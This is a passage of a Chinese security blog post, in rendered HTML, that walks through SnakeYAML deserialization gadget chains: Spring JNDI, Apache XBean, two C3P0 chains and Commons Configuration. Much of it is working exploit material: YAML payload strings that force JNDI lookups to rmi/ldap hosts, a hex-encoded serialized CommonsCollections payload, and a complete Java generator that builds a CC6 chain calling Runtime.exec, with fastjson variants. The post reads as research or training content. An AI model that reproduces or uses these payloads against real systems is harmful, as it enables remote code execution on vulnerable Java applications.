class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-expression<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>触发点在此处，我们把beanFactory设置成SimpleJndiBeanFactory即可触发到。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/59.png" class="" title="Pasted image 20260806153526">
+
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/60.png" class="" title="Pasted image 20260806153453">
+
+<p>设置targetBeanName为<code>ldap://localhost:1099/Exploit</code>。同时注意满足上面的if语句，propertyPath不为null。<code>beanFactory.isSingleton</code>要为true。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/61.png" class="" title="Pasted image 20260806153922">
+
+<p>所以让shareableResources跟targetBeanName一样即可。<br>然后最后触发jndi注入的地方如下：</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/62.png" class="" title="Pasted image 20260806155246">
+
+<p>展示：</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/63.png" class="" title="Pasted image 20260806155316">
+
+<h2 id="Apache-XBean"><a href="#Apache-XBean" class="headerlink" title="Apache XBean"></a>Apache XBean</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-naming<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在 <code>ContextUtil</code> 的内部类 <code>ReadOnlyBinding</code> 里面的 <code>getObject()</code> 方法里面，调用了 <code>ContextUtil.resolve()</code></p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/64.png" class="" title="Pasted image 20260806155542">
+
+<p>然后我们在其中发现了一个 Jndi 注入的注入点</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/65.png" class="" title="Pasted image 20260806155932">
+
+<p>开始构造exp：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.management.BadAttributeValueExpException &quot;</span> +  </span><br><span class="line">        <span class="string">&quot;[!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding &quot;</span> +  </span><br><span class="line">        <span class="string">&quot;[\&quot;Drunkbaby\&quot;,!!javax.naming.Reference [\&quot;foo\&quot;, \&quot;calc\&quot;, \&quot;http://localhost:8888/\&quot;],&quot;</span> +  </span><br><span class="line">        <span class="string">&quot;!!org.apache.xbean.naming.context.WritableContext []]]&quot;</span>;</span><br></pre></td></tr></table></figure>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/66.png" class="" title="Pasted image 20260806162444">
+
+<p>接下来我们可以分析一下，逐步构造payload<br>reference从resolve的value参数而来，而value参数是构造函数的第二个参数。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/67.png" class="" title="Pasted image 20260806162614">
+
+<p>那么我们首先可以构造初步的payload：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot; !!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding &quot;</span> +  </span><br><span class="line">        <span class="string">&quot;[ \&quot;Meteor_Kai\&quot;,!!javax.naming.Reference [\&quot;foo\&quot;, \&quot;calc\&quot;, \&quot;http://localhost:8888/\&quot;]]&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>但是我们无法触发getValue啊，setter才能触发。<br>这里就用到了 <code>BadAttributeValueExpException</code> 这个类</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/68.png" class="" title="Pasted image 20260806163125">
+
+<p>其中接受object参数，后触发<code>val.toString()</code>方法。那就是触发ReadOnlyBinding的toString方法，然后我们看看源码。发现其继承自Binding类，同时Binding类中存在toString方法且调用了getObject，完美闭环。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/69.png" class="" title="Pasted image 20260806164351">
+
+<p>构造exp：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.management.BadAttributeValueExpException&quot;</span> +  </span><br><span class="line">        <span class="string">&quot; [!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding&quot;</span> +  </span><br><span class="line">        <span class="string">&quot; [\&quot;Meteor_Kai\&quot;,!!javax.naming.Reference [\&quot;foo\&quot;, \&quot;calc\&quot;, \&quot;http://localhost:8888/\&quot;],&quot;</span> +  </span><br><span class="line">        <span class="string">&quot;!!org.apache.xbean.naming.context.WritableContext []]]&quot;</span>;</span><br></pre></td></tr></table></figure>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/70.png" class="" title="Pasted image 20260806165517">
+
+
+<h2 id="C3P0-JndiRefForwardingDataSource"><a href="#C3P0-JndiRefForwardingDataSource" class="headerlink" title="C3P0 JndiRefForwardingDataSource"></a>C3P0 JndiRefForwardingDataSource</h2><p>exp如下：<br>跟fastjson反序列化的几乎是一模一样的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0JndiRefForwardingDataSourceEXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot; jndiName: \&quot;rmi://localhost:1099/Exploit\&quot;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot; loginTimeout: 1&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        yaml.load(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="C3P0-WrapperConnectionPoolDataSource"><a href="#C3P0-WrapperConnectionPoolDataSource" class="headerlink" title="C3P0 WrapperConnectionPoolDataSource"></a>C3P0 WrapperConnectionPoolDataSource</h2><p>同样也是 C3P0 的一条链子，使用了hexbase攻击。<br>exp如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot;</span> +  </span><br><span class="line">        <span class="string">&quot; userOverridesAsString: \&quot;HexAsciiSerializedMap:aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b78707400094d6574656f724b61697372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000047372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65707400096765744d6574686f64757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001c7371007e00137571007e0018000000027070740006696e766f6b657571007e001c00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e00137571007e00180000000174000463616c63740004657865637571007e001c0000000171007e001f7371007e00003f4000000000000c77080000001000000000787871007e000678;\&quot;&quot;</span>;  </span><br></pre></td></tr></table></figure>
+
+<p>这里的hex值通过c3p0链的脚本获得，要结合cc链。注意不能大写，要小写才行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantFactory;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">myexp_hexbase</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">CC6</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map lazymap= LazyMap.decorate(hashmap,<span class="keyword">new</span> <span class="title class_">ConstantFactory</span>(<span class="number">1</span>));  </span><br><span class="line">        TiedMapEntry tiedmapentry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;MeteorKai&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object,Object&gt;expmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        expmap.put(tiedmapentry,<span class="string">&quot;MeteorKai&quot;</span>);  </span><br><span class="line">        lazymap.remove(<span class="string">&quot;MeteorKai&quot;</span>);  </span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        factoryField.set(lazymap, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> expmap;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//将类序列化为字节数组  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);  </span><br><span class="line">        oos.writeObject(o);  </span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//字节数组转十六进制  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;  </span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)  </span><br><span class="line">            addHexAscii(bytes[i], sw);  </span><br><span class="line">        <span class="keyword">return</span> sw.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;  </span><br><span class="line">        sw.write(toHexDigit(h1));  </span><br><span class="line">        sw.write(toHexDigit(h2));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">char</span> out;  </span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);  </span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);  </span><br><span class="line">        <span class="comment">//System.err.println(h + &quot;: &quot; + out);  </span></span><br><span class="line">        <span class="keyword">return</span> out;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">hex_payload</span> <span class="operator">=</span> toHexAscii(tobyteArray(CC6()));  </span><br><span class="line">        <span class="comment">//fastjson &lt;= 1.2.24  </span></span><br><span class="line"><span class="comment">//        String payload = &quot;&#123;&quot; +  </span></span><br><span class="line"><span class="comment">//                &quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot; +  </span></span><br><span class="line"><span class="comment">//                &quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ hex_payload + &quot;;\&quot;,&quot; +  </span></span><br><span class="line"><span class="comment">//                &quot;&#125;&quot;;  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//fastjson &lt; 1.2.47        String payload = &quot;&#123;&quot; +  </span></span><br><span class="line">                <span class="string">&quot;\&quot;1\&quot;:&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;2\&quot;:&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex_payload + <span class="string">&quot;;\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">        System.out.println(hex_payload);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/71.png" class="" title="Pasted image 20260806171753">
+
+<h2 id="Apache-Commons-Configuration"><a href="#Apache-Commons-Configuration" class="headerlink" title="Apache Commons Configuration"></a>Apache Commons Configuration</h2><p>依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>exp如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;!!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \&quot;rmi://127.0.0.1:1099/hello\&quot;]]: 1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/72.png" class="" title="Pasted image 20260806172058">
+
+<p>然后我们顺着分析一下调用链：<br>ConfigurationMap中存在put方法，其中调用<code>configuration.getProperty</code></p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/73.png" class="" title="Pasted image 20260806175233">
+
+<p>我们把<code>configuration</code>设置为JNDIConfiguration，然后跟进<code>JNDIConfiguration#getProperty</code>。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/74.png" class="" title="Pasted image 20260806172547">
+
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/75.png" class="" title="Pasted image 20260806172748">
+
+<p>发现其中存在lookup！一眼jndi注入。但是实际上我们的注入点不在这里，因为key是null啊！我们跟进<code>getBaseContext</code>方法。发现其中也存在lookup，且后面的值是我们可控的<code>this.prefix</code></p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/76.png" class="" title="Pasted image 20260806173257">
+
+<p>我们需要通过构造函数设置context为<code>javax.naming.InitialContext</code>，以及prefix为jndi的payload。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/77.png" class="" title="Pasted image 20260806173408">
+
+<p>然后就是如何触发ConfigurationMap的put方法了。这个点我们在CC链遇到过。当 SnakeYAML 反序列化一个 <strong><code>Map</code> 类型的对象</strong>，并且遇到 <strong><code>key: value</code> 这样的键值对</strong>时，它会调用 <code>Map.put(key, value)</code> 来填充数据。</p>
+<p>那么就可以构造exp了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;!!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \&quot;rmi://127.0.0.1:1099/hello\&quot;]]: 1&quot;</span>;</span><br><span class="line"></span><br><span class="line">!!org.apache.commons.configuration.ConfigurationMap</span><br><span class="line">[</span><br><span class="line">    !!org.apache.commons.configuration.JNDIConfiguration</span><br><span class="line">    [</span><br><span class="line">        !!javax.naming.InitialContext [],</span><br><span class="line">        <span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span></span><br><span class="line">    ]</span><br><span class="line">]: <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
